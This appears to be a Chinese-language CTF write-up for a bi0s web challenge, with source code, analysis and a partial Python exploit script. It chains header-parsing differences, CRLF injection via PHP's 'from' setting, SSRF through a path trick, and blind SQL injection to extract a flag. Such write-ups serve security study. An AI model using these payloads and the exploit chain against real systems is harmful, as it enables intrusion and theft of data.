+                                fmt.Fprintf(w, <span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)
+                                <span class="hljs-keyword">return</span>  
+                            }
+
+                        }
+                }
+                
+        proxy.ServeHTTP(w, r)
+    }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
+        url, err := url.Parse(<span class="hljs-string">&quot;http://app:5000&quot;</span>)
+    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+        fmt.Println(err)
+    }
+        proxy := httputil.NewSingleHostReverseProxy(url)
+
+        http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, ProxyRequestHandler(proxy))
+        http.HandleFunc(<span class="hljs-string">&quot;/admin&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
+                fmt.Fprintf(w, <span class="hljs-string">&quot;Hello World!\n&quot;</span>)
+})
+        log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-literal">nil</span>))
+}</code></pre><p>存在两个路由<code>/</code>与<code>/admin</code>，其中/路由将我们的请求转发到<code>http://app:5000</code>
+同时对<code>header</code>中的<code>X-pro-hacker</code>、<code>flag</code>、<code>Token</code>三个字段做了限制</p>
+<p>要求<code>X-pro-hacker</code>为空，<code>flag</code>不能出现<code>gimme</code>，<code>Token</code>则是不能有<code>[6]string{&quot;&#39;&quot;, &quot;\&quot;&quot;, &quot;)&quot;, &quot;(&quot;, &quot;)&quot;,&quot;=&quot;}</code>这些字符</p>
+<p>在python的flask项目中则要求<code>request.headers.get(&quot;X-pro-hacker&quot;)==&quot;Pro-hacker&quot; and &quot;gimme&quot; in request.headers.get(&quot;flag&quot;)</code>，注意一个是<code>==</code>一个是<code>in</code></p>
+<p>这里则需要利用go与flask解析的差异性，</p>
+<p>go当中只获取第一个header的内容，</p>
+<p>在flask当中会把header当中的<code>_</code>替换为<code>-</code>，同时如果header双写会用<code>,</code>进行拼接</p>
+<p>因此我们如果构造这样的请求，则可以绕过go端的校验</p>
+<pre class="hljs"><code><span class="hljs-attribute">GET / HTTP/1.1
+X_pro-hacker</span>: Pro-hacker
+<span class="hljs-attribute">flag</span>: 
+<span class="hljs-attribute">flag</span>: gimme</code></pre><p>同时在flask眼中以上内容最终会转换为</p>
+<pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">X-pro-hacker</span><span class="hljs-punctuation">: </span>Pro-hacker
+<span class="hljs-attribute">flag</span><span class="hljs-punctuation">: </span>,gimme</code></pre><p>接下来我们来具体看看flask部分</p>
+<h5 id="app"><a class="header-link" href="#app"></a>app:</h5>
+<p>首先在里面会初始化sqlite数据库，将flag保存到了users与flag两张表</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_db</span>():</span>
+    <span class="hljs-keyword">try</span>: 
+        conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),<span class="hljs-string">&#x27;users.db&#x27;</span>))
+        cursor = conn.cursor()
+        result = cursor.executescript(<span class="hljs-string">f&quot;&quot;&quot;
+            CREATE TABLE IF NOT EXISTS users  (
+                                                    username  TEXT, 
+                                                    token TEXT
+                                                );
+            CREATE TABLE IF NOT EXISTS flag  (
+                                                flag_is_here  TEXT
+                                            );                                                  
+            Delete from users;
+            Delete from flag;
+            INSERT INTO users values (&#x27;user&#x27;,&#x27;some_randomtoken&#x27;),
+                                    (&#x27;admi&#x27;,&#x27;some_randomtoken&#x27;),
+                                    (
+                                        &#x27;admin&#x27;,
+                                        &#x27;<span class="hljs-subst">{FLAG}</span>&#x27;
+                                    );
+            INSERT INTO flag values (&#x27;<span class="hljs-subst">{FLAG}</span>&#x27;);
+            &quot;&quot;&quot;</span>)
+        conn.commit()
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre><p>程序仅有一个路由，要求header中的<code>X-pro-hacker</code>、<code>flag</code>字段为指定内容</p>
+<p>同时根据header中的参数<code>Token</code>做数据库的查询操作</p>
+<p>另外我们可以看到如果存在user参数那么会取前38位执行add_user操作</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_user</span>(<span class="hljs-params">user,token</span>):</span>
+    q = <span class="hljs-string">f&quot;INSERT INTO users values (&#x27;<span class="hljs-subst">{user}</span>&#x27;,&#x27;<span class="hljs-subst">{token}</span>&#x27;)&quot;</span>
+    db_query(q)
+    <span class="hljs-keyword">return</span>
+  
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> init_db():
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&quot;X-pro-hacker&quot;</span>)==<span class="hljs-string">&quot;Pro-hacker&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;gimme&quot;</span> <span class="hljs-keyword">in</span> request.headers.get(<span class="hljs-string">&quot;flag&quot;</span>):
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&quot;Token&quot;</span>):         
+                token = request.headers.get(<span class="hljs-string">&quot;Token&quot;</span>)
+                token = token[:<span class="hljs-number">16</span>]
+                token = token.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>)
+                <span class="hljs-keyword">if</span> request.form.get(<span class="hljs-string">&quot;user&quot;</span>):
+                    user = request.form.get(<span class="hljs-string">&quot;user&quot;</span>)
+                    user = user[:<span class="hljs-number">38</span>]
+                    add_user(user,token)            
+                query = <span class="hljs-string">f&#x27;SELECT * FROM users WHERE token=&quot;<span class="hljs-subst">{token}</span>&quot;&#x27;</span>
+                res = db_query(query)
+                res = res.fetchone()
+                <span class="hljs-keyword">return</span> res[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> res <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(res[<span class="hljs-number">0</span>])&gt;<span class="hljs-number">0</span>  <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;INDEX\n&quot;</span>
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            <span class="hljs-built_in">print</span>(e) 
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;INDEX\n&quot;</span></code></pre><p>首先是<code>request.form.get(&quot;user&quot;)</code>,这个是POST表单的参数，我们如何能成功传递呢？毕竟当前路由只支持<code>GET</code>请求</p>
+<p>其实flask识别<code>request.form</code>是依据Header头是否是<code>Content-Type:application/x-www-form-urlencoded</code>来判断的，因此我们只要加上并把参数放在请求体当中即可
+因此很明显我们需要通过sql注入获取到flag表中flag_is_here字段的内容，由于token在go端做了字符限制，我们考虑仅在user字段中执行注入</p>
+<p>由于flag表中仅有一个flag_is_here字段，因此我们可以用*替代减少payload长度
+由于add_user当中为insert那么我们就可以考虑插入再查询的方式，通过盲注获取数据
+构造如下，发现刚好长度为36，还预留了两个长度的位置，(毕竟flag长度也不会超过1000，所以完全够用了)，通过下面的语句我们每次可以将flag的一个字符带入到user表中</p>
+<p class="img-container"><img src="https://imgur.com/YuhdDfd.png" alt=""></p>
+<p>之后我们通过select语句查询单字符的token，如果不存在则返回<code>INDEX</code>，存在则返回token内容，不断重复上述步骤即可获取到flag所有内容</p>
+<pre class="hljs"><code>query = <span class="hljs-string">f&#x27;SELECT * FROM users WHERE token=&quot;<span class="hljs-subst">{token}</span>&quot;&#x27;</span>
+res = db_query(query)
+res = res.fetchone()
+<span class="hljs-keyword">return</span> res[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> res <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(res[<span class="hljs-number">0</span>])&gt;<span class="hljs-number">0</span>  <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;INDEX\n&quot;</span></code></pre><p>而这个配置文件仅仅只有一行，禁止直接访问uploads路径下的文件</p>
+<pre class="hljs"><code><span class="hljs-attribute"><span class="hljs-nomarkup">Deny</span></span> from <span class="hljs-literal">all</span></code></pre><p>接下来看看代码，简简单单只有几个文件</p>
+<p class="img-container"><img src="https://imgur.com/ON4zwfH.png" alt=""></p>
+<p>接下来所有代码都为去除前端样式部分，仅保留php代码</p>
+<p>登录页面接收username参数并保存到session当中，之后根据sessionid生成隔离用户目录</p>
+<pre class="hljs"><code><span class="hljs-comment">//login.php</span>
+<span class="hljs-meta">&lt;?php</span>
+session_start();
+<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-string">&#x27;uploads&#x27;</span>)) {
+    mkdir(<span class="hljs-string">&#x27;uploads&#x27;</span>);
+}
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])){
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])){
+        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>];
+        <span class="hljs-variable">$folder</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.session_id().<span class="hljs-string">&quot;/&quot;</span>;
+        <span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$folder</span>)) {
+          mkdir(<span class="hljs-variable">$folder</span>);
+        }  
+        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;folder&#x27;</span>] = <span class="hljs-variable">$folder</span>;
+        header(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);
+        <span class="hljs-keyword">die</span>();
+
+    }<span class="hljs-keyword">else</span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no username provided&quot;</span>;
+    }
+}
+
+<span class="hljs-meta">?&gt;</span></code></pre><p>接下来是index.php部分，这里主要有两个功能一个是根据参数new创建文件夹，同时对参数new用check_name函数做了校验</p>
+<pre class="hljs"><code><span class="hljs-variable">$FOLDER</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;folder&#x27;</span>];
+
+
+<span class="hljs-comment">//create new folder inside uploads using get parameter</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])) {
+    <span class="hljs-keyword">if</span>(check_name(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;new&quot;</span>])){
+        <span class="hljs-variable">$newfolder</span> = <span class="hljs-variable">$FOLDER</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>];
+        <span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$newfolder</span>)) {
+            
+            mkdir(<span class="hljs-variable">$newfolder</span>);
+        }<span class="hljs-keyword">else</span>{
+            <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;folder already exist&quot;</span>;
+        }
+    }<span class="hljs-keyword">else</span>{
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;not allowed&#x27;</span>);
+    }
+}
+check_name过滤了符号.与/，同时里面还调用了report函数
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_name</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{
+    <span class="hljs-keyword">if</span>(gettype(<span class="hljs-variable">$filename</span>)===<span class="hljs-string">&quot;string&quot;</span>){
+        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[.\/]/i&quot;</span>,<span class="hljs-variable">$filename</span>)){
+            report();
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        }<span class="hljs-keyword">else</span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//safe</span>
+        }
+    }
+    <span class="hljs-keyword">else</span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">report</span>(<span class="hljs-params"></span>)</span>{
+    <span class="hljs-comment">//report usename</span>
+    ini_set(<span class="hljs-string">&quot;from&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);
+    file_get_contents(<span class="hljs-string">&#x27;http://localhost/report.php&#x27;</span>);
+
+}</code></pre><p>另一个是文件上传功能，可以指定path上传文件，不过可惜也经过check_name做了校验，另一点文件名取后缀，并使用uniqid函数获取随机前缀，</p>
+<p>因此我们便不能上传一些配置文件覆盖原来的htaccess下的配置</p>
+<p>同时虽然对后缀没有过滤，由于本身有htaccess下的限制也无法访问到我们上传的文件</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;submit&quot;</span>])){
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])&amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>])){
+        <span class="hljs-keyword">if</span>(!check_name(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;path&quot;</span>])){
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed&quot;</span>);
+        }
+        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
+        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
+        <span class="hljs-variable">$fileSize</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];
+        <span class="hljs-variable">$fileError</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];
+        <span class="hljs-variable">$fileExt</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$fileName</span>);
+        <span class="hljs-variable">$fileActualExt</span> = strtolower(end(<span class="hljs-variable">$fileExt</span>));
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fileError</span> === <span class="hljs-number">0</span>){
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fileSize</span> &lt; <span class="hljs-number">100000</span>){
+                <span class="hljs-variable">$name</span> = uniqid(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-literal">true</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$fileActualExt</span>;
+                <span class="hljs-variable">$fileDestination</span> = <span class="hljs-variable">$FOLDER</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>];
+                upload(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$fileDestination</span>,<span class="hljs-variable">$name</span>);
+                header(<span class="hljs-string">&quot;Location: index.php?uploadsuccess&quot;</span>);
+            }<span class="hljs-keyword">else</span>{
+                <span class="hljs-variable">$error</span> =  <span class="hljs-string">&quot;Your file is too big!&quot;</span>;
+            }
+        }<span class="hljs-keyword">else</span>{
+            <span class="hljs-variable">$error</span> =  <span class="hljs-string">&quot;There was an error uploading your file!&quot;</span>;
+        }
+        
+    }<span class="hljs-keyword">else</span>{
+        <span class="hljs-variable">$error</span> =  <span class="hljs-string">&quot;parameter missing&quot;</span>;
+    }
+}</code></pre><p>最后是view.php，根据参数fol可以查看我们上传的文件名，同时也有check_name做路径限制</p>
+<pre class="hljs"><code><span class="hljs-variable">$FOLDER</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;folder&#x27;</span>];
+<span class="hljs-variable">$dirr</span> = [<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>];
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fol&#x27;</span>])){
+    
+    <span class="hljs-comment">//echo $FOLDER.$_GET[&#x27;fol&#x27;];</span>
+    <span class="hljs-keyword">if</span>(check_name(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fol&#x27;</span>]) &amp;&amp; is_dir(<span class="hljs-variable">$FOLDER</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fol&#x27;</span>])){
+        <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-variable">$files</span> = array_diff(scandir(<span class="hljs-variable">$FOLDER</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fol&#x27;</span>]),<span class="hljs-variable">$dirr</span>);
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) {
+            
+            <span class="hljs-variable">$c</span>.= <span class="hljs-string">&quot;&lt;li class=\&quot;list-group-item\&quot;&gt;&lt;a href=&#x27;/view.php?file=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fol&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$f</span>.<span class="hljs-string">&quot;&#x27;&gt;<span class="hljs-subst">$f</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;
+
+        }
+        <span class="hljs-keyword">echo</span> str_replace(<span class="hljs-string">&quot;CONTENT&quot;</span>,<span class="hljs-variable">$c</span>,<span class="hljs-variable">$files_template</span>);
+    }<span class="hljs-keyword">else</span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;folder not found&lt;/div&gt;&#x27;</span>;
+    }
+}</code></pre><p>根据参数file可以查看对应的文件内容，不过有限制只能读取后缀为txt、png与jpg后缀的文件</p>
+<p>如果注意看可以看到这里type的写法有点小问题给了我们操作的空间 ，后面会提到</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])){
+    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
+    <span class="hljs-variable">$ext</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file</span>);
+    <span class="hljs-variable">$type</span> = substr(strtolower(end(<span class="hljs-variable">$ext</span>)),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);
+    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$FOLDER</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>;
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$type</span>===<span class="hljs-string">&quot;txt&quot;</span>){
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$file</span>)){
+                chdir(<span class="hljs-variable">$FOLDER</span>);
+                <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);
+            }<span class="hljs-keyword">else</span>{
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;</span>;
+            }
+        } <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$th</span>) {
+           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;</span>;
+        }
+        
+    }
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$type</span>===<span class="hljs-string">&quot;png&quot;</span> || <span class="hljs-variable">$type</span>===<span class="hljs-string">&quot;jpg&quot;</span>){
+
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$file</span>)){
+                chdir(<span class="hljs-variable">$FOLDER</span>);
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;data:image/<span class="hljs-subst">$type</span>;base64,&quot;</span>.base64_encode(file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])).<span class="hljs-string">&quot;\&quot; &gt;&quot;</span>;
+            }<span class="hljs-keyword">else</span>{
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;</span>;
+            }
+        } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$th</span>) {
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;</span>;
+        }
+        
+    }
+    <span class="hljs-keyword">else</span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Invaild type&lt;/div&gt;&#x27;</span>;
+    }
+
+}</code></pre><h4 id="ssrf"><a class="header-link" href="#ssrf"></a>SSRF:</h4>
+<p>既然不能rce，那有什么办法呢？ssrf同时又能控制header</p>
+<p>答案在report函数中</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">report</span>(<span class="hljs-params"></span>)</span>{
+    <span class="hljs-comment">//report usename</span>
+    ini_set(<span class="hljs-string">&quot;from&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);
+    file_get_contents(<span class="hljs-string">&#x27;http://localhost/report.php&#x27;</span>);
+
+}</code></pre><p>可以在网上搜索到这个<a href="https://bugs.php.net/bug.php?id=81680">https://bugs.php.net/bug.php?id=81680</a></p>
+<p>从漏洞描述可以看到妥妥的CRLF注入</p>
+<blockquote>
+<p>When we set &quot;From&quot; field by setting ini setting &quot;from&quot;, which is used for &quot;ftp&quot; and &quot;http&quot; file wrapper, it can inject an arbitrary string in the raw socket message.
+Since the injected string can contain CR-LF sequence(\r\n), this can be used to interrupt the flow of FTP stream or injecting/smuggling an outgoing HTTP request.</p>
+</blockquote>
+<p>同时下面还给了一个简洁的例子，从这里可以看到我们注入的Header在最上方，那么岂不是想控制啥控制啥嘞</p>
+<p class="img-container"><img src="https://imgur.com/z8aR8mE.png" alt=""></p>
+<h5 id="为什么不能污染host"><a class="header-link" href="#为什么不能污染host"></a>为什么不能污染HOST</h5>
+<p>然而当我们简单构造好username发过去触发report后会发现什么都没发生</p>
+<p>这里我们先本机测试下</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-comment">/**
+ * Author: Y4tacker
+ */</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">report</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>)</span>{
+    ini_set(<span class="hljs-string">&quot;from&quot;</span>,<span class="hljs-variable">$username</span>);
+    file_get_contents(<span class="hljs-string">&#x27;http://ip:1234/report.php&#x27;</span>);
+
+
+}
+
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])){
+    report(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);
+};</code></pre><p>明明Host当中端口已经变了，为什么还是1234呢？</p>
+<p class="img-container"><img src="https://imgur.com/PaYspRw.png" alt=""></p>
+<p>经过简单的php源码调试我们可以发现:</p>
+<p>事实上其实在发送数据前，php已经根据我们的url与对应ip和port建立好了连接</p>
+<p class="img-container"><img src="https://imgur.com/oFgOB8A.png" alt=""></p>
+<p>之后再发送完整数据包</p>
+<p class="img-container"><img src="https://imgur.com/YyspUHt.png" alt=""></p>
+<p>因此不论我们如何污染Host都是在原有的tcp连接上进行的通信</p>
+<p>那我们怎么办呢？虽然能成功CRLF注入，但如何控制HOST呢？</p>
+<h5 id="成功的ssrf-尝试"><a class="header-link" href="#成功的ssrf-尝试"></a>成功的SSRF 尝试:</h5>
+<p>纵观全局所有代码，我们只能看到view.php当中存在可控制的点</p>
+<p>还记得我们之前说这个获取$type存在问题么？</p>
+<p class="img-container"><img src="https://imgur.com/P66R6Bx.png" alt=""></p>
+<p>乍一看这里逻辑本来是判断后缀后，判断文件是否存在之后再读取，看着没什么问题呀？</p>
+<p>而问题就在于这个type是取<code>.</code>后的三个字符</p>
+<p>那么如果我们创建一个名为<code>http:</code>的文件夹</p>
+<p>之后让file值等于<code>http://xxx.xxx.xxx.txt@waf</code>，这样看也许不明显，那如果我们看看绝对路径呢？</p>
+<p><code>/var/www/html/uploads/sessionid/http://xxx.xxx.xxx.txt@waf</code></p>
+<p>我们知道php通常会做路径标准化，<code>//</code>会被替换成<code>/</code>，那么这个路径</p>
+<p><code>/var/www/html/uploads/sessionid/http:/xxx.xxx.xxx.txt@waf</code></p>
+<p>这样也就能通过file_exists函数了</p>
+<h4 id="exp"><a class="header-link" href="#exp"></a>Exp:</h4>
+<p>结合完整攻击路径将以上步骤串联起来写出exp</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> io
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> requests
+
+flag = <span class="hljs-string">&#x27;&#x27;</span>
+base_url = <span class="hljs-string">&#x27;http://web.chall.bi0s.in:8000&#x27;</span>
+flag_chars = <span class="hljs-string">&#x27;abcdef0123456789&#x27;</span>
+hijack_tpl = <span class="hljs-string">&#x27;\r\n&#x27;</span>.join([
+    <span class="hljs-string">&#x27;anything&#x27;</span>,                  <span class="hljs-comment"># could be anything(including &#x27;&#x27;)</span>
+    <span class="hljs-string">&#x27;X_pro-hacker: Pro-hacker&#x27;</span>,  <span class="hljs-comment"># bypass waf, flask will replace underscore with dash</span>
+    <span class="hljs-string">&#x27;flag: bypass-waf&#x27;</span>,          <span class="hljs-comment"># the waf only takes the first flag in HTTP header</span>
+    <span class="hljs-string">&#x27;flag: gimme&#x27;</span>,               <span class="hljs-comment"># but flask puts headers with the same name into a array</span>
+    <span class="hljs-string">&#x27;Host: just-need-this-header&#x27;</span>,
+    <span class="hljs-string">&#x27;Content-Type:application/x-www-form-urlencoded&#x27;</span>,
+    <span class="hljs-string">&#x27;Token: {}&#x27;</span>,
+    <span class="hljs-string">&#x27;Content-Length: {}&#x27;</span>,        <span class="hljs-comment"># with Content-Length set to len(payload)</span>
+    <span class="hljs-string">&#x27;&#x27;</span>,                          <span class="hljs-comment"># and 2 CRLFs marking the end of header</span>
+    <span class="hljs-string">&#x27;{}&#x27;</span>,                        <span class="hljs-comment"># to control the HTTP body</span>
+])
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):  <span class="hljs-comment"># from the challenge description we know len(flag) == 9</span>
+    <span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> flag_chars:
+        <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:
+            sqli = <span class="hljs-string">f&quot;user=a&#x27;,substr((select * from flag),<span class="hljs-subst">{i + <span class="hljs-number">1</span>}</span>,1))-- &quot;</span>
+            username = hijack_tpl.<span class="hljs-built_in">format</span>(token, <span class="hljs-built_in">len</span>(sqli), sqli)
+
+            <span class="hljs-comment"># login</span>
+            s.post(<span class="hljs-string">f&quot;<span class="hljs-subst">{base_url}</span>/login.php&quot;</span>,
+                   data={<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>})
+
+            <span class="hljs-comment"># create folder</span>
+            s.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/index.php?new=http:&#x27;</span>)
+
+            <span class="hljs-comment"># upload txt</span>
+            s.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/index.php&#x27;</span>,
+                   data={<span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;http:&#x27;</span>, <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>},
+                   files={<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;.txt@waf&#x27;</span>, io.BytesIO())})  <span class="hljs-comment"># an empty file-like object is ok</span>
+
+            <span class="hljs-comment"># get txt file name</span>
+            txt = re.search(<span class="hljs-string">r&quot;@waf&#x27;&gt;(?P&lt;txt&gt;[^&lt;]*)&quot;</span>,
+                            s.get(<span class="hljs-string">f&quot;<span class="hljs-subst">{base_url}</span>/view.php?fol=http:&quot;</span>).text).group(<span class="hljs-string">&#x27;txt&#x27;</span>)
+
